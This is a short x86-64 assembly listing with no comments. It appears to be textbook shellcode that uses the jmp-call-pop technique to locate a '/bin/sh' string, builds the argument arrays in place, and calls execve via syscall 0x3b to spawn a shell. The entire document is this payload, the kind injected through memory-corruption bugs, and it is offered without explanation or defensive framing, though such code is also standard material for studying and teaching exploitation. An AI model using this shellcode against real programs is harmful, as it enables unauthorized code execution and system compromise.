BITS 64
    jmp short two
one:
    pop rdi
    xor rax, rax
    mov [rdi+7], al
    mov [rdi+8], rdi
    mov [rdi+16], rax
    lea rsi, [rdi+8]
    lea rdx, [rdi+16]
    mov al, 0x3b
    syscall
two:
    call one
    db '/bin/shXAAAAAAAABBBBBBBB'